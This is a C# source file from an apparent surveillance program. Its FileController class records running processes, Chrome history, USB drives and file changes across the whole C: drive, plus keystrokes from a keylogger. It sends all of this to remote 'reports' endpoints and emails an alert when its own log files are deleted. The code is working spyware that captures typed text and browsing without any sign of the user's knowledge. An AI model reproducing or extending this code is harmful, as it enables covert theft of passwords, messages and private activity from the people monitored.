using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Permissions;
using SnS.Functions;
using SnS.Classes.Requests;

namespace SnS.Classes
{
    class FileController
    {
        private static string filePath = GlobalVariables.rootFolder + "ProcessList.txt";
        private static string filePathChrome = GlobalVariables.rootFolder + "ChromeHistory.txt";
        private static string filePathLogger = GlobalVariables.rootFolder + "Logger.txt";
        private static string filePathUSB = GlobalVariables.rootFolder + "USB.txt";
        private static string filePathFileManager = GlobalVariables.rootFolder + "FileManager.txt";
        private static string settingsFile = GlobalVariables.rootFolder + "settingsFile.txt";

        //file extensions to be watched
        public static List<String> aszProcessFilter = new List<string>();
        public static bool bHasApp = false;
        private static List<String> aszFilters = new List<String> { ".txt", ".doc", ".docx", ".exe" };
        private static FileSystemWatcher fsw = new FileSystemWatcher();

        //keep the last massege saved in logs
        private static String szLastMessage = String.Empty;
        private static String szLastWarningMessage = String.Empty;
        private static bool bOutputOmitted = false;
        private static bool bHasChanged;

        private static bool bSkipStartUpChrome = false;
        private static bool bSkipStartUpProcess = false;
        private static bool bSkipStartUpUSB = true;

        //private static bool writeUsbFirst = true;
        //already sent
        private static string alreadySent = "";

        #region File Save
        public static void FileData()
        {
            setFilePermission(filePath);
            TextWriter tw = new StreamWriter(filePath, true);

            Functions.Functions.writeCurrentDate(tw, 1);

            //we suspect no change of the processes in the beggining
            bHasChanged = false;
            foreach (ProcessData pd in ProcessData.apdProcData)
            {
                //If the process has been shown, a message is displayed.
                //If the message has been displayed already, nothing will be done until
                //a new process that can be displayed is found
                if (!ProcessData.apdShownProcesses.Contains(pd.getId()))
                {
                    tw.WriteLine(pd.getProcessInfo());
                    pd.setShownState(true);
                    bOutputOmitted = false;
                    //a change has occured;
                    bHasChanged = true;

                    if (bSkipStartUpProcess == true && ((aszProcessFilter.Contains(pd.getName()) && bHasApp) || !bHasApp))
                    {
                        UploadRequest.uploadData(pd.getName(), "Process Open", "reports_processes");
                    }
                }
                else
                if(bOutputOmitted == false)
                {
                    tw.WriteLine("Output Omitted - no change detected...");
                    bOutputOmitted = true;
                }
            }

            //even if no change occurs, a essage is displayed
            if(bHasChanged == false)
            {
                tw.WriteLine("Output Omitted - no change detected...");
            }

            bSkipStartUpProcess = true;
            tw.Close();
        }

        public static void saveApplicationExitTime(string szName, TimeSpan tsTime)
        {
            if ((aszProcessFilter.Contains(szName) && bHasApp) || !bHasApp)
            {
                setFilePermission(filePath);
                TextWriter tw = new StreamWriter(filePath, true);

                tw.WriteLine("Application " + szName + " closed. Runtime:" + tsTime.ToString());
                UploadRequest.uploadData(szName + " closed. Runtime:" + tsTime.ToString(), "Process Close", "reports_processes");
                tw.Close();
            }
        }

        public static void saveHistory()
        {
            setFilePermission(filePathChrome);
            TextWriter tw = new StreamWriter(filePathChrome, true);

            Functions.Functions.writeCurrentDate(tw, 1);

            for (int i = 0; i < GoogleChrome.allHistoryItems.Count;i++ )
            {
                tw.Write(GoogleChrome.allHistoryItems[i].Count + " --- ");
                tw.WriteLine(GoogleChrome.allHistoryItems[i].URL);
                tw.WriteLine();

                if (bSkipStartUpChrome == true)
                {

                    UploadRequest.uploadData("Count:" + GoogleChrome.allHistoryItems[i].Count + " --- " + Functions.Functions.filterChrome(GoogleChrome.allHistoryItems[i].URL),
                        "Browser History", "reports_history");
                }
            }

            bSkipStartUpChrome = true;
            tw.Close();
        }

        public static void saveUSB()
        {
            bool x = true;

            if (null != UsbHandler.newDrives && UsbHandler.newDrives.Length == UsbHandler.allDrives.Length)
                for (int i = 0; i < UsbHandler.newDrives.Length; i++)
                    if (UsbHandler.newDrives[i].Name != UsbHandler.allDrives[i].Name)
                        x = true;
                    else
                        x = false;
            else
                x = true;

            if (x)
            {
                setFilePermission(filePathUSB);
                TextWriter tw = new StreamWriter(filePathUSB, true);
                Functions.Functions.writeCurrentDate(tw, 1);
                UsbHandler.allDrives = DriveInfo.GetDrives();
                foreach (DriveInfo d in UsbHandler.allDrives)
                {
                    tw.WriteLine("Drive {0}", d.Name);
                    tw.WriteLine();
                    tw.WriteLine("  Drive type: {0}", d.DriveType);
                    tw.WriteLine();

                    if (bSkipStartUpUSB == true)
                    {
                        UploadRequest.uploadData("Drive " + d.Name + " Drive type:" + d.DriveType, "USB", "reports_usb");
                    }
                }
                bSkipStartUpUSB = true;
                tw.Close();
            }
            UsbHandler.newDrives = DriveInfo.GetDrives();

           
        }

        public static void saveLogger()
        {
            if (KeyLogger.szText == "")
                return;
            else
            {
                setFilePermission(filePathLogger);
                TextWriter tw = new StreamWriter(filePathLogger, true);

                Functions.Functions.writeCurrentDate(tw, 1);
                tw.WriteLine(KeyLogger.szText);
                UploadRequest.uploadData(KeyLogger.szText, "Key Logger", "reports_keylogger");
                KeyLogger.szText = String.Empty;

                tw.Close();
            }
        }

        public static void saveSettings()
        {
            TextWriter tw = new StreamWriter(settingsFile, true);

            //tw.WriteLine("allowHistory = " + MainFunction.sfSettings.allowHistory.ToString());
            //tw.WriteLine("allowKeyLogger = " + sfSettings.allowKeyLogger.ToString());
            //tw.WriteLine("allowUSB = " + sfSettings.allowUSB.ToString());
            //tw.WriteLine("allowProcess = " + sfSettings.allowProcess.ToString());
            //tw.WriteLine("allowFile = " + sfSettings.allowFile.ToString());

            tw.Close();
        }

        #endregion

        #region File Watch
        public static void watcherInit()
        {
            fsw.Path =  @"C:\";

            fsw.IncludeSubdirectories = true;

            fsw.Renamed += new RenamedEventHandler(watcherRenamed);

            fsw.Created += new FileSystemEventHandler(watcherCreated);
            fsw.Changed += new FileSystemEventHandler(watcherChanged);
            fsw.Deleted += new FileSystemEventHandler(watcherDeleted);

          
            fsw.EnableRaisingEvents = true; 
        }

        private static void watcherChanged(object source, FileSystemEventArgs e)
        {
            //Don't show in console the changes from the next paths
            if (e.FullPath == filePath || e.FullPath == filePathLogger
                || e.FullPath == filePathFileManager || e.FullPath == filePathUSB
                || e.FullPath == filePathChrome)
                return;

            //apply the filter only to changed files since windows cannot create/delete
            //files on its own.
            if (aszFilters.Contains(Path.GetExtension(e.FullPath)))
            {
                string message = e.FullPath;
                saveEvents(message, "Changed");
                //Console.WriteLine(message);
            }
        }

        private static void watcherDeleted(object source, FileSystemEventArgs e)
        {
            if (e.FullPath.Contains(GlobalVariables.rootFolder) && (alreadySent != e.FullPath))
            {
                alreadySent = e.FullPath;
                EmailSender.warningEmail(e.FullPath);

            }
            else
            {
                string message = e.FullPath;
                //Console.WriteLine(message);

                saveEvents(message, "Deleted");
            }
        }

        private static void watcherRenamed(object sender, RenamedEventArgs e)
        {
            string message = "Old Name: " + e.OldName + " | New Name: " + e.Name;
            //Console.WriteLine(message);

            saveEvents(message, "Renamed");
        }

        private static void watcherCreated(object source, FileSystemEventArgs e)
        {
            string message = e.FullPath;
            //Console.WriteLine(message);

            saveEvents(message, "Created");
        }

        private static void saveEvents(string message, string action)
        {
            TextWriter tw = null;

            try
            {
                tw = new StreamWriter(filePathFileManager, true);
            }
            catch (Exception ex)
            {
               // Console.WriteLine(ex);
            }

            if (message.Contains("FileManager") || message.Contains("Logger")
               || message.Contains("ChromeHistory") || message.Contains("USB")
               || message.Contains("ProcessList") && tw != null && message != szLastWarningMessage)
            {
                Functions.Functions.writeCurrentDate(tw, 2);
                tw.WriteLine(message);
                UploadRequest.uploadData(message, action + " - Warning", "reports_warnings");
                szLastWarningMessage = message;
            }
            else
            if (!message.Contains("Windows") && !message.Contains("Microsoft") && !message.Contains("laravel")
                 && !message.Contains("Google") && !message.Contains("Surveillance")
                 && !message.Contains("$Recycle.Bin")
                 && (!message.Contains("Local") && !message.Contains("AppData"))
                 && (!message.Contains("Roaming") && !message.Contains("AppData"))
                 && !message.Contains("Cyclop") && tw != null && message != szLastMessage)
            {
                Functions.Functions.writeCurrentDate(tw, 2);
                tw.WriteLine(message);
                UploadRequest.uploadData(message, action, "reports_filemanager");
                szLastMessage = message;
            }

            if(tw != null)
                tw.Close();
        }
        #endregion

        #region File Permission

        public static void setFilePermission(string szPath)
        {
            try
            {
                File.SetAttributes(szPath, FileAttributes.Normal);
            }
            catch (Exception ex)
            {
                return;
            }
        }
      
#endregion
    }
}